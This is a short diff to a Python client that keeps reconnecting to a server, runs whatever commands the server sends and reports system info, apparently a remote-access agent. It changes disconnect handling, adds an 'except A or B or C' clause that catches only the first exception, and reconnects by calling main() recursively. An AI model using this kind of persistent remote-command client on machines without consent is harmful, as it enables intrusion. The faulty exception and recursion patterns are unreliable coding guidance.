@@ -70,10 +70,6 @@ def communicate(s: socket.socket, system_info: dict) -> None:
             while True:
                 try:
                     message = receive_secure_json(s, derived_key)
-                    if message is None:
-                        print("Server disconnected.")
-                        s.close()
-                        main()
 
                     if message.get("type") == "request":
                         response_tuple = run_command(message.get("command"))
@@ -105,14 +101,16 @@ def connect_to_server() -> socket.socket:
 
 
 def main() -> None:
-
     s = connect_to_server()
     s.settimeout(SEND_HEARTBEAT_INTERVAL)
 
     try:
         communicate(s, get_system_info())
+    except ConnectionResetError or ConnectionAbortedError or ConnectionRefusedError:
+        print("Socket closed.")
     except Exception as e:
         print(e)
+    finally:
         s.close()
         main()
 
